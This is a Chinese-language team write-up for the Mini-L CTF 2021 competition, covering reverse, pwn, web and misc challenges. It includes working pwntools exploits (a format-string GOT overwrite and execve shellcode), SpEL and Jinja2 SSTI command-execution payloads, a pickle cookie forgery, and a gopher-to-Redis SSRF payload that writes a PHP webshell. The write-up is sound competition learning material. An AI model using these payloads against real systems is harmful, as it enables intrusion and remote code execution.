# *Mini-L CTF 2021* : **H4n53r-TEAM**

:100::     :8ball: :evergreen_tree: :key:



**Mini-L CTF 2021**
		**UserName:** **H4n53r**
		**Final Rank:** **2nd**
		**Members:**    **DeeBaTo \ innerSpace-HS \ CyXq**
		**ITEMS:**   **Crypto \ Pwn \ Reverse \ Web \ Misc**
		**StartTime:**  **2021/5/6 20:00**
		**EndTime:**    **2021/5/12 20:00**

# **Reverse:**

## 0ooops | hs | done

其实说实话没怎么看懂这道题……最后做出来题也是爆破出来的

==0x00 初见==

首先拖进ida，简单美化一下代码

```c
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  char v4[28]; // [esp+E0h] [ebp-F0h] BYREF
  char ipt[104]; // [esp+14Ch] [ebp-84h] BYREF
  CPPEH_RECORD ms_exc; // [esp+1B8h] [ebp-18h]

  j_memset(ipt, 0, 0x64u);
  strcpy(v4, "Please input your flag: ");
  j_memset(&v4[25], 0, 0x4Bu);
  printf("%s", (char)v4);
  scanf("%s", (char)ipt);
  if ( (unsigned __int8)check(ipt) )
  {
    MEMORY[0] = 0;
    ms_exc.registration.TryLevel = -2;
  }
  fail();
  return 0;
}
```

此时ida反汇编已经出问题了……

所以直接看汇编，发现在`loc_82330`有`try-except`

```assembly
.text:00082330 loc_82330:                              ; CODE XREF: _main_0+15C↑j
.text:00082330 ;   __try { // __except at loc_82377
.text:00082330                 mov     [ebp+ms_exc.registration.TryLevel], 0
.text:00082337                 lea     ebx, [ebp+ipt]
.text:0008233D                 xor     eax, eax
.text:0008233F                 db      3Eh             ; Keypatch modified this from:
.text:0008233F                 mov     dword ptr [eax], 0 ;   mov dword ptr [eax], 0
.text:0008233F                                         ; Keypatch padded NOP to next boundary: 6 bytes
.text:0008233F                                         ; Keypatch modified this from:
.text:0008233F                                         ;   mov dword ptr [eax], 0
.text:0008233F                                         ; Keypatch padded NOP to next boundary: 6 bytes
.text:00082346                 mov     edx, 0
.text:0008234B                 div     edx
.text:0008234B ;   } // starts at 82330
.text:0008234D                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
.text:00082354                 jmp     short loc_82381
.text:00082356 ; ---------------------------------------------------------------------------
.text:00082356
.text:00082356 loc_82356:                              ; DATA XREF: .rdata:stru_8A238↓o
.text:00082356 ;   __except filter // owned by 82330
.text:00082356                 mov     eax, [ebp+ms_exc.exc_ptr]
.text:00082359                 mov     ecx, [eax]
.text:0008235B                 mov     edx, [ecx]
.text:0008235D                 mov     [ebp+a1], edx
.text:00082363                 mov     eax, [ebp+ms_exc.exc_ptr]
.text:00082366                 push    eax             ; a2
.text:00082367                 mov     ecx, [ebp+a1]
.text:0008236D                 push    ecx             ; a1
.text:0008236E                 call    j_key_func_2
.text:00082373                 add     esp, 8
.text:00082376                 retn
.text:00082377 ; ---------------------------------------------------------------------------
.text:00082377
.text:00082377 loc_82377:                              ; DATA XREF: .rdata:stru_8A238↓o
.text:00082377 ;   __except(loc_82356) // owned by 82330
.text:00082377                 mov     esp, [ebp+ms_exc.old_esp]
.text:0008237A                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
```



猜测应该是`try`部分代码出现问题，比如如下两句

```assembly
.text:0008233F                 mov     dword ptr [eax], 0 ;
.text:00082346                 mov     edx, 0
.text:0008234B                 div     ed
```

一个是向一个不可访问的地址写入数据，一个是用0做分母，引发了报错，然后进入`except`

==0x01 发现关键代码==

其实在发现`try-except`语句之前，我瞎j8翻了翻`text`段，找到了两个非常可疑的函数，非常像flag验证程序，如下	(函数声明与数据类型已经过修正)

```c
int __stdcall key_func1(int **a1)
{
  unsigned int i; // [esp+D0h] [ebp-40h]
  char v3[40]; // [esp+DCh] [ebp-34h]
  char *v4; // [esp+104h] [ebp-Ch]

  __CheckForDebuggerJustMyCode();
  if ( **a1 != 0xC0000005 )
    return 0;
  v4 = (char *)(a1[1][41] + 9);
  v3[0] = 16;
  v3[1] = 4;
  v3[2] = 24;
  v3[3] = 11;
  v3[4] = 24;
  v3[5] = 16;
  v3[6] = 4;
  v3[7] = 21;
  v3[8] = 11;
  v3[9] = 5;
  v3[10] = 31;
  v3[11] = 46;
  v3[12] = 33;
  v3[13] = 46;
  v3[14] = 72;
  v3[15] = 21;
  v3[16] = 6;
  v3[17] = 46;
  v3[18] = 17;
  v3[19] = 69;
  v3[20] = 5;
  v3[21] = 62;
  v3[22] = 46;
  v3[23] = 24;
  v3[24] = 21;
  v3[25] = 72;
  v3[26] = 46;
  v3[27] = 69;
  v3[28] = 33;
  v3[29] = 31;
  v3[30] = 10;
  for ( i = 0; i < 31; ++i )
  {
    if ( v3[i] != (((v4[2 * i] ^ 0x37) + 4) ^ 0x42) )
    {
      a1[1][46] += 66;
      return -1;
    }
  }
  a1[1][46] += 7;
  return -1;
}
```

```c
int __cdecl key_func2(int a1, int **a2)
{
  unsigned int i; // [esp+D0h] [ebp-40h]
  char v4[40]; // [esp+DCh] [ebp-34h] BYREF
  char *v5; // [esp+104h] [ebp-Ch]

  __CheckForDebuggerJustMyCode();
  if ( **a2 != 0xC0000094 )
    return 0;
  v5 = (char *)(a2[1][41] + 9);
  qmemcpy(v4, "!V -}VG-bp}m-nG!b|ra GyGE|Drp D", 31);
  for ( i = 0; i < 31; ++i )
  {
    if ( v4[i] != ((unsigned __int8)a2[1][46] ^ ((v5[2 * i + 1] ^ 0x4D) - 4) ^ 0x13) )
    {
      a2[1][46] += 54;
      return -1;
    }
  }
  a2[1][46] += 63;
  return -1;
}
```

其实最开始看到这两端代码的时候还是挺异或的(后来发现main函数的`exception`可以调用`key_func2`,`key_func1`由一个`Handler`调用)……发现对指针`a1`和`a2`的使用有点像二维数组（进行了两次解引用），然后修改数据类型之后，代码变得正常了一些。

`key_func1`比较正常，直接可以解出一个字符串，exp如下

```python
str1=[16,4,24,11,24,16,4,21,11,5,31,46,33,46,72,21,6,46,17,69,5,62,46,24,21,72,46,69,33,31,10]
for i in str1:
    x = ((i ^ 0x42) - 4) ^ 0x37 
    print(chr(x),end="")

# yuarayudrtn_h_1dw_x4tO_ad1_4hns
```

问题出在`key_func2`，该函数在验证的时候（line 14）使用了`a2[1][46]`，按照我的分析进度，这个数值是不可知的，最后决定爆破，看当`a2[1][46]`为何值时，可以使解出来的明文全都是可见字符，并且与第一段明文拼接之后可以得到有意义的字符串，下面是爆破脚本

```
7H63cHY3tfcs3pY7tbdw6YY[bZdf6Z
6I72bIX2ugbr2qX6ucev7X~XZc[eg7[
5J41aJ[1vdaq1r[5v`fu4[}[Y`Xfd4X
4K50`KZ0we`p0sZ4wagt5Z|ZXaYge5Y
3\27g\m7pbgw7tm3pf`s2mkmofn`b2n
2]36f]l6qcfv6ul2qgar3ljlngoac3o
1^05e^o5r`eu5vo1rdbq0oiomdlb`0l
0_14d_n4sadt4wn0secp1nhnlemca1m
#l"'wl]'`rwg'd]#`vpc"]{]_v^pr"^
"m#&vm\&asvf&e\"awqb#\z\^w_qs#_
!n %un_%bpue%f_!btra _y_]t\rp \
 o!$to^$cqtd$g^ cus`!^x^\u]sq!]
```

下面是拼接两端明文的脚本

```python
str1="yuarayudrtn_h_1dw_x4tO_ad1_4hns"
str2="7H63cHY3tfcs3pY7tbdw6YY[bZdf6Z "
str3="6I72bIX2ugbr2qX6ucev7X~XZc[eg7["
str4="5J41aJ[1vdaq1r[5v`fu4[}[Y`Xfd4X"
str5="4K50`KZ0we`p0sZ4wagt5Z|ZXaYge5Y"
str6="3\\27g\m7pbgw7tm3pf`s2mkmofn`b2n"
str7="2]36f]l6qcfv6ul2qgar3ljlngoac3o"
str8="1^05e^o5r`eu5vo1rdbq0oiomdlb`0l"
str9="0_14d_n4sadt4wn0secp1nhnlemca1m"
flag="miniLctf{"
for i in range(31):
    flag+=str1[i]
    flag+=str9[i]
flag+="}"
print(flag)
```

发现使用`str9`，即`a2[1][46]`为75时，可以得到flag

`miniLctf{y0u_a1r4ady_und4rstand_th4_w1nd0ws_exc4pt1On_handl1e_m4chan1sm}`

尝试提交之后发现flag正确，但是没有弄懂为什么`a2[1][46]`是75

## sub | hs | done

```c
 __CheckForDebuggerJustMyCode(&unk_408015);
  memset(Filename, 0, 0x200u);
  GetModuleFileNameA(0, Filename, 0x200u);
  Stream = fopen(Filename, "rb");
  fseek(Stream, 0, 2);
  Size = ftell(Stream);
  Buffer = malloc(Size);
  fseek(Stream, 0, 0);
  fread(Buffer, 1u, Size, Stream);
  v22 = Buffer;
  v21 = (int)Buffer + *((_DWORD *)Buffer + 15);
  v20 = v21 + 4;
  v19 = v21 + 24;
  v18 = v21 + 24 + *(unsigned __int16 *)(v21 + 20);
  ElementCount = *(_DWORD *)(v18 + 40 * (*(unsigned __int16 *)(v21 + 6) - 1) + 16);
  Offset = *(_DWORD *)(v18 + 40 * (*(unsigned __int16 *)(v21 + 6) - 1) + 20);
  Block = malloc(ElementCount);
  fseek(Stream, Offset, 0);
  fread(Block, 1u, ElementCount, Stream);
  sub_401000(Block, ElementCount);
  
  
  
  
  
  unsigned int __cdecl sub_401000(int a1, unsigned int a2)
{
  unsigned int result; // eax
  unsigned int i; // [esp+D0h] [ebp-14h]

  __CheckForDebuggerJustMyCode(&unk_408015);
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a2 )
      break;
    *(_BYTE *)(i + a1) ^= 0x64u;
  }
  return result;
}
```
首先有一个自修改代码，用idapython脚本解一下smc
```python
from ida_bytes import *
for i in range(0x8b00):
    patch_byte(0x40A000+i, get_byte(0x40A000+i)^0x64)
```

然后搜索字符串发现可以找到`Please input your flag: `等字符串，但是无法找到交叉引用，这时看0x40A000地址处的数据，发现有点像一个PE文件的文件头（看了好久才发现），然后把smc部分的十六进制数据提取出来，另存为一个新的hex文件，再次用ida反编译，可以看到真正代码
```c
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
  size_t v3; // eax
  char v5; // [esp+0h] [ebp-10Ch]
  char v6; // [esp+0h] [ebp-10Ch]
  char Str[56]; // [esp+D0h] [ebp-3Ch] BYREF

  __CheckForDebuggerJustMyCode(&unk_40C015);
  memset(Str, 0, 0x32u);
  sub_401082("Please input your flag: ", v5);
  sub_401023("%s", (char)Str);
  v3 = strlen(Str);
  if ( (unsigned __int8)off_40A040(Str, v3) )
    sub_401082("Congratulation~~~", v6);
  else
    sub_401082("Try again~~~", v6);
  return 0;
}
```
其实这里的off_40A040（check）函数有点问题，直接点进去发现解出来的是个fake flag，交叉引用发现这个check函数有被更改过，在下面的代码里
```c
NTSTATUS __stdcall TlsCallback_0_0(int a1, int a2, int a3)
{
  HANDLE v3; // eax
  NTSTATUS result; // eax
  NTSTATUS (__stdcall *NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG); // [esp+D0h] [ebp-20h]
  HMODULE hModule; // [esp+DCh] [ebp-14h]
  int v7; // [esp+E8h] [ebp-8h] BYREF

  __CheckForDebuggerJustMyCode(&unk_40C015);
  hModule = LoadLibraryW(L"Ntdll.dll");
  NtQueryInformationProcess = (NTSTATUS (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(hModule, "NtQueryInformationProcess");
  v3 = GetCurrentProcess();
  result = NtQueryInformationProcess(v3, ProcessDebugPort, &v7, 4, 0);
  if ( v7 )
    off_40A040 = (int (__cdecl *)(_DWORD, _DWORD))sub_4011C7;
  else
    off_40A040 = (int (__cdecl *)(_DWORD, _DWORD))j_fini;
  return result;
}
```

然后进入到正确的check(j_fini)函数

```c
char __cdecl fini_func(int a1, int a2)
{
  int i; // [esp+DCh] [ebp-8h]

  __CheckForDebuggerJustMyCode(&unk_40C015);
  if ( a2 != 32 )
    return 0;
  for ( i = 0; i < 32; ++i )
  {
    if ( (char)(((*(_BYTE *)(i + a1) ^ 0x55) + 4) ^ 0x66) != byte_40A000[i] )
      return 0;
  }
  return 1;
}
```
可以解出来flag
`miniLctf{hs_1s_s0_1nt4r4st1ng!!}`

# **Pwn:**

## Baby_Repeater | hs | done

刚开始pwn，会的东西少，被迫学了如何做开启pie的题、64位的格式化字符串漏洞。
主要思想是，先用格式化字符串读取elf二进制文件加载的地址(elf_base)、libc加载的地址(libc_base)。
然后用格式化字符串漏洞挟持got表，我的exp里改写了exit函数的got表。
挟持got表的时候使用了one_gadget来进行getshell。
问题是如果利用格式化字符串漏洞直接向exit的got表写入一个超级大的数字，那么首先就要在shell输出这么多数字，这样做是会出错的，所以将one_gadget的地址拆成三个2字节的数字，再进行写入。

exp如下
```python
from pwn import *
binary_name = "baby_repeater"
io = process(["./libc-2.31.so","./baby_repeater"],env={"LD_PRELOAD":"./libc-2.31.so"})
#io = remote("pwn.woooo.tech",10044)
elf = ELF("./baby_repeater")
libc = ELF("./libc-2.31.so")
context(binary="./baby_repeater",log_level="debug")
#gdb.attach(io,"b printf")

ru = lambda x:io.recvuntil(x)
sl = lambda x:io.sendline(x)
#fmt_str_offset = 8

ru("> ")
sl("%115$p")
ru("Your sentence: ")
elf_base = int(io.recv(14),16) - 0x14D5
log.info("elf_base : " + hex(elf_base))

ru("> ")
sl("%111$p")
ru("Your sentence: ")
libc_base = int(io.recv(14),16) - 243 - libc.sym['__libc_start_main']
log.info("libc_base : " + hex(libc_base))

exit_addr = elf.got['exit'] + elf_base
one_gadgets = [0xe6c7e,0xe6c81,0xe6c84]
one_gadget = one_gadgets[1] + libc_base
log.info("one_gatdet : " + hex(one_gadget))

one1 = (one_gadget & 0xffff)-15
one2 = ((one_gadget>>16) & 0xffff)-15
one3 = ((one_gadget>>32) & 0xffff)-15

log.info("one1:"+hex(one1+15))
payload = flat([('%'+str(one1)+'c%10$hn').ljust(16,'A'),
                exit_addr])
ru("> ")
sl(payload)

log.info("one2:"+hex(one2+15))
payload = flat([('%'+str(one2)+'c%10$hn').ljust(16,'A'),
                exit_addr+2])
ru("> ")
sl(payload)

log.info("one3:"+hex(one3+15))
payload = flat([('%'+str(one3)+'c%10$hn').ljust(16,'A'),
                exit_addr+4])
ru("> ")
sl(payload)

ru("> ")
sl("exit")
io.interactive()

```

## Shellocde_Loader | hs | done

这题没出真是太可惜了，裂开
```python
from pwn import *
io = process("./shellcode_loader")
context(binary="./shellcode_loader",log_level="debug")
#gdb.attach(io,"b __isoc99_scanf")
shellcode1="\x48\x31\xc0\x48\x89\xc7\x48\x8d\x75\x10\x0f\x05\xff\xe6"
io.sendline(shellcode1)
shellcode2="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
io.sendline(shellcode2)
io.interactive()
```
shellcode1如下，shellcode2是在网站上找的现成的shellcode。

```assembly
global _start
_start:
xor rax,rax
mov rdi,rax
lea rsi,[rbp+0x10]
syscall
jmp rsi
```

# **Web:**

## Java | CyXq | done
做这道题前，Java负基础(啥也不会,甚至怀疑人生)
题目打开给个压缩包，下载下来发现是一个Java的小项目的源文件，把每个都打开看看，感觉比较关键的文件是这个

```java
package com.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.net.MalformedURLException;

@RestController
public class MainController {
    ExpressionParser parser = new SpelExpressionParser();


    @RequestMapping("/")
    public String main(HttpServletRequest request,@RequestParam(required = false) String code,@RequestParam(required = false) String url) throws MalformedURLException {
        String requestURI = request.getRequestURI();
        if(requestURI.equals("/")){
            return "nonono";
        }
        else{
            if (code!=null) {
                String s = parser.parseExpression(code).getValue().toString();
                return s;
            } else {
                return "so?";
            }
        }
    }
}
```
==**代码审计**==
比较关键的一些知识点如下：

- @RequestMapping('/')
- getRequestURI()
- equals("/")
- parser.parseExpression(code).getValue().toString()

==**解题思路**==
由于代码很少，基础知识了解了，解题的思路也就出来了
首先，题目的描述中给了提示：`flag在/flag中`，利用给出的提示，拿到flag的方式无非有两种，通过命令执行，如`cat /flag`，或者直接通过文件读取，读取到`/flag`的内容
payload:/?code=T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/flag'), T(java.nio.charset.Charset).defaultCharset())
`flag:miniL{edd0faa3-c21b-40da-ac82-53bf734299c9}`

## L inc. | CyXq | done

 经过一些尝试，得到题目的第一步应该是认证vip身份
 抓包，看到cookie应该是base64:`gASVLAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjANjeXOUjAN2aXCUiXViLg==`
 用python解一下：`b'\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x03app\x94\x8c\x04User\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x03cys\x94\x8c\x03vip\x94\x89ub.'`
结合PHP序列化的字符串，这个看起来也像是一个序列化字符串
实际上这就是python的序列化字符串，`cys`前是它的长度
用python的pickletools处理一下
![](https://md.wanan.world/uploads/upload_10667b8f37e9704b922233a85cb8dde9.png)
注意到`\x89`是NEWFALSE
尝试一下`\x90,\x88`，可知`\x88`是NEWTRUE
将更改后的字符串base64encode，作为cookie
成功认证vip身份
![](https://md.wanan.world/uploads/upload_52a37576e67982552ee86f0e46d3f24f.png)
并且可以看到前面的输入回显到了页面上，猜测是SSTI
输入`{{3*3}}`成功回显9
这里我做题时没来及的写脚本，所以是直接输入payload，抓包，改包认证vip身份来做题的
paylaod:
**查目录**
`gASVjwAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGZ7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdscyAvJykucmVhZCgpIikgfX2UjAN2aXCUiHViLg==`
**查flag**
`gASVlAAAAAAAAACMA2FwcJSMBFVzZXKUk5QpgZR9lCiMBG5hbWWUjGt7eyB4Ll9faW5pdF9fLl9fZ2xvYmFsc19fLl9fZ2V0aXRlbV9fKCdfX2J1aWx0aW5zX18nKS5ldmFsKCJfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdjYXQgL2ZsYWcnKS5yZWFkKCkiKSB9fZSMA3ZpcJSIdWIu`
![](https://md.wanan.world/uploads/upload_d6d3bccd12659fac1c8aa23baca7ba63.png)
![](https://md.wanan.world/uploads/upload_f67b42cadb955b527885b7ce39a837e5.png)



## Template | CyXq | done
这题拿了ctf生涯第一个一血
看题目名字大概可以确定这是一道模板注入的题目
经过简单的测试，可能是通过JS过滤了`'{''}''%'`,想到调试一下题目JS代码，看看能否去掉过滤(这里稍稍与lt师傅出题时候的想法不一样，相当于走了个小捷径)，
进入到JS的源码部分，直接搜索`{`找到进行过滤的代码位置，这里我设了断点，通过调试大概看了一下submit函数的执行流程，从界面直接获取输入，对输入内容进行黑名单搜索，搜到就会调用alert()结束代码的继续运行。所以直接把黑名单改掉，这里我直接啥也没过滤。
没有JS的过滤了，那么就可以进行模板注入了,首先常规的`{{3*3}}`得到回显9，应该是jinja2的模板注入
经过简单的测试，过滤了`'class','base','subclasses','init','flag','os','.','+','|',单引号`
这里‘|’过滤掉相当于过滤器基本用不了了，只能使用常规的`"".__class__.__base__.__subclasses__()`链条去执行命令，jinja2有个特性，`""["__class__"]=="".__class__`，基于此，可以通过"进行字符拼接，利用这个特性绕过.以及关键词的过滤
一开始想着用这个链条` x["__init__"]["__globals__"]["__getitem__"]("__builtins__")`去调用命令执行模块,后来发现想的太简单了,可能由于python版本等诸多原因,这个payload在服务器端是打不通的
之后想通过遍历找到可以执行命令的模块,写了这个payload:`{% for c in ""["__cl""ass__"]["__ba""se__"]["__subcl""asses__"]() %}
{% if c["__na""me__"] == "catch_warnings" %}
{{c["__in"it__"]["__getitem__"]["__globals__"]["__builtins__"]["eval"]("__import__(\"o\"\"s\")[\"system\"](\"ls /\")") }}
{% endif %}
{% endfor %}`但是可能由于相同的原因,这个payload也打不通
最后没办法只好通过手撕去查找,题目能利用的模块,我是用这个链条完全的手撕...(主要是最开始做题目虽然走了捷径,但也把思路禁锢在了直接在输入框中进行注入,没有想到抓包,写脚本跑一下)`{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[0]}}`最后得到
![](https://md.wanan.world/uploads/upload_94f34288d38dac39001673f52d59b64b.png)
找到了可以执行命令的模块就什么都好说了
最终payload:
`{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("ls /")["read"]()}}`
![](https://md.wanan.world/uploads/upload_a60b7469307a4d305c1ae59e79754fe6.png)
`{{""["__cl""ass__"]["__ba""ses__"]["__getitem__"](0)["__subcl""asses__"]()[177]["__in""it__"]["__globals__"]["__builtins__"]["__import__"]("o""s")["popen"]("cat /f*")["read"]()}}`
## protocol | CyXq | done
题目打开，是一个提示可以输入URL的框，猜测考察SSRF
进行简单的手动测试，得到过滤了`file://`,`dict`,`localhost`,`../`
`file://`被过滤了，可以尝试`file:/`去绕过
POST传参，`url=file:/var/www/html/index.php`
得到了页面的源码
```php
<?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}

if(isset($_POST['url'])){
	$url = $_POST['url'];
	if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match)) {
		die('这样子可不行哦');
	}
	curl($url);
}

if(isset($_POST['minisecret'])){
	system('ifconfig eth1');
}
?>
```
POST，minisecret会执行`ifconfig eth1`，让我们查看到相应的网卡信息
![](https://md.wanan.world/uploads/upload_25a0e665bf7591c2ad5f4ea7fde5634d.png)
由此也得到了另一台主机的内网地址，访问一下，是可以访问通的，但什么都没有。尝试手动测试一下，同一网段下是否还有其他可访问的主机，172.192.97.3/4/5 都试了一下。可以访问的是172.192.97.3
![](https://md.wanan.world/uploads/upload_5423e7b0c4619ac339ffdee660f14b62.png)
由于gopher协议是没有被过滤的，可以首先测试一下3306(mysql)以及6379(redis)是否开启服务，得到redis是有服务的
那么解决办法就是利用gopher协议去打redis，最终得到flag
起初想写入Webshell，然后用工具去连接，但这是不行的，已知的ip应该是一个内网ip，无法通过蚁剑等从外部连接
所以就想能否直接在shell中通过执行命令把flag查出来并回显
运行生成payload的工具`gopherus`,写入`<?php system('cat /f*'); ?>`(这里基于前几题的flag位置进行了一点猜测)
payload：`url=gopher://172.192.97.3:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3F%20system%28%27cat%20/f%2A%27%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A`
再利用SSRF访问172.192.97.3/shell.php，成功得到回显
![](https://md.wanan.world/uploads/upload_ad9e6c4927c71fa317adc882552e77ad.png)

# **Misc:**

## 好白给的签到题 | dbt | done
5140w 字符 离谱....cao...但是发现是base64解码...
```python=
import base64
from os import read
f = open(r'.\story.txt','rb')
c = f.read().strip()
s = c
while 1:
    try:
        s = base64.b64decode(s)
        print(s)
    except:
        try :
            s = base64.b64decode(s[::-1])
            print(s)
        except:
            break
```
一开始只解上半部分的时候发现解到一半GG了...看下print的东西好像逆过来就能解了..emm再看看题目中说她是兔子.想到斐波那契..干把..倒过来试...可以！ 但是后面还是GG了 因为无等号  那就拖出来继续自己解  手撕...
```python
s = '9smRjNnSWF2b4dkV6BHbStGdrJVcaZUVxM3VZhlWFJlaO52UHZkMURDZrZFNwFTYXhGbSRHZxM2caVlW5plRidFaX5kcK1WVzhnMVpnWsJFbw1mVyRGbNNEarlFVWpXYThWRjhXSWl1Rwh1VyI0MhxmWGF2ckx2YHRGMWNDayEGWoV0YyFzaWtmWVpFMwZkYsR3aWdXVsZ1QotWWYJ1VSpGZrdFeRZVW0QGbWdXUE10UsdUYHBHbSdEZWpVYatWYXpFShpXWsZVNjBTW6BnRiVlQU1EWaxWTahXbVNHcxEGWaZ0YHZ0VZdkUWdlW41WZohmRhlFZGVmVGpXWop1ahdlWEFGWK1GVzRGMZBjUHJ2U0VVTYJVMSdnRUlFWoJTYSxGbTlXWxQVMjZlVhBHbWlGasRlcWxmVzplVaNDaYJ2V5s2VWpkMW9UNtZFNxsWTUJlaTFnWWd1SGpWVwplRiJlVGp1RW1mUrpVMWlkWFZVakZkY1RWMjdkSqZFSSJTYYxGSjJnSGdFM01WVWh3VN5EdrdlVSZ0VTR2aZdFaXZ1TaVkWHZVbhFGetZFNGxWZo5kRhNnUWN1VkVkWYBnVSFGeFN2VxAjVHRWVZpFcwIFWSREZ0plRNdHetZVYShlYTZkbXdVMwY1U41mVZpFblhGaGplcOZ0U4NnMWhGcsJ1VKRUZ0ZlMVtGeHZlS1UlYT5kVNRnWG1kUKRVWZhXbSpmWsNVeVFjUrZlVXpkQIJ2U0d1T0JFbONnWwYFV1sWYXJkRjhXRHd1a0JTV1Y1aNhmUU1Edax2U3ZlVU9kVUJVYkZVTGRmRlJkUGZVTChkYXZFbSRnVGN1aaxmVyh2MWdlVEJ2caZUYDJ1aXpnSsZlWk52VyxmRXdHdtVFaCh0VW5kbWdkVtVVYWxmV'
s = base64.b64decode(s[::-1])
s = (base64.b64decode(s))
s = (base64.b64decode(s))
s = (base64.b64decode(s))
s = (base64.b64decode(s))
s = base64.b64decode(s[::-1])
s = (base64.b64decode(s))
s = (base64.b64decode(s))
s = base64.b64decode(s[::-1])
s = (base64.b64decode(s))
s = base64.b64decode(s[::-1])
s = base64.b64decode(s[::-1])
print(s[::-1])
```
flag:`MiniLCTF{5o_m@ny_Inn3r5p4ce_hs!!}`
## 抓猫猫 | dbt | done
nc...发现你输了很多次都是他能赢..为什么呢...因为只要他抓了之后剩下的是偶数你必然输，那其实如果比他小的话你是必然输的  那就瞎试试看？
从1开始 一接收到他的是偶数 断开重连，继续...到4之后。欸他给了个3nice
那就手输1 xswl
出了
flag:`miniL{c6d5bfc0-c92e-4d05-9d08-724667ee5900}`!
## 好康的硬盘 | CyXq&hs | done

晚上做完了Web3，寻思去看看Misc3，从来没做过取证，呜呜呜，下载下来是一个名字为zip的文件，010打开，看到zip文件头`50 4B 03 04`，显然需要修改文件后缀名，然后解压得到了`flag.txt`和一个`rar`，binwalk，foremost啥也没搞出来，NTFS隐写也是啥也没有，没思路了，所以第一天晚上这题咕了。第二天起来，上午试了无数的方法都解不出来压缩包，也搞不懂`flag.txt`咋回事，直到下午伟大的树神告诉我`flag.txt`中可能有零宽字符隐写，即刻跑到羊羊师傅的博客搜一波，搜到了，然后学了一波。这里贴一下羊羊师傅的博客(http://www.ga1axy.top/)
kali中vim打开`flag.txt`，看到
![](https://md.wanan.world/uploads/upload_843f0cb7884cae5a5c173c6f19674b75.png)
yep!确实是零宽字符隐写，在线网站解就好，得到`minil****`
这个应该就是`rar`压缩包的密码的一部分，手试了几次，全部以失败告终......
想着试着把`rar`拖进ARCHPR爆破提示文件格式解析不了，网上搜到说是ARCHPR爆破不了rar5，把题目的`rar`拖进010，看到文件头为`52 61 72 21 1A 07 01 00`,确实是rar5的文件头。去网上搜怎么爆破rar5的密码，查到可以用rar2john+hashcat，然后花了一下午装这俩工具，期间出现了无数的小问题，我是真的菜，但凡之前少嫖几次别人工具直接用，自己找几次，装个工具都不会这么费劲。
有工具了啥都好说，这里还要说羊羊师傅yyds，在羊羊师傅博客里以最快速度学会了怎么用hashcat爆破
kali，`rar2john flag.txt`得到rar压缩包的hash
windows，`./hashcat64.exe -m 13000 -a 3 '$rar5$16$529d132521c41a0d068fa8ceeab29cde$15$8c79ff2fb201f8b6c1a0981bb57e20c9$8$4138cf0615f62942' minil?a?a?a?a`
![](https://md.wanan.world/uploads/upload_3cb41e2a280eff86b961d3957471102b.png)
解压rar压缩包，img文件终于出来了，呜呜呜
搜到个能搞硬盘的工具(X-Ways Forensics),把img文件拖进去，用这东西也费了好多时间，因为属实没用过，不会用。 最后发现可以直接看分区目录，点了一下分区1......
![](https://md.wanan.world/uploads/upload_c37c4b94f3b378fa6b6550f1a3477e41.png)
az，出来了，"好康的"，看了两遍视频挺有意思的，被开头吸引（bushi，然后树神看了一眼，让我把视频发给他，过了一会，给我发回来7张图片（hsyyds），得到的一串数字是:`7355608`（cs放C4输的，哈哈哈）
接下来应该就是最后一步了，从“奇怪的邮件”中找线索，利用这串数字解出flag！
这里想吐槽自己，为什么这么喜欢用微软的搜索引擎，搜了俩小时啥也没搜到，英语学弱被迫看了好几遍邮件内容，咋看都觉得`Senate bill 1621 ; Title 3 , Section 303 .`,`Senate bill 2116 , Title 9 , Section 309`,`Why work for somebody else when you can Why work for somebody else when you can become rich within 38 WEEKS !Why work for somebody else when you can become rich inside 59 days ! become rich within 81 days`这些等等没完没了重复的东西不对劲，可是就是搜不到，后来破罐子破摔，开梯子去谷歌搜了一下`Senate bill 2116 , Title 9 , Section 309`一下就搜到解密网站了，哎
![](https://md.wanan.world/uploads/upload_24df2ff44a13271ca11496c0ed6125ad.png)
flag：`MiniLCTF{n3ver_g0nna_L3t_H5_dowN}`

## Recombination | dbt | done
rar伪加密对着文件头去修复，
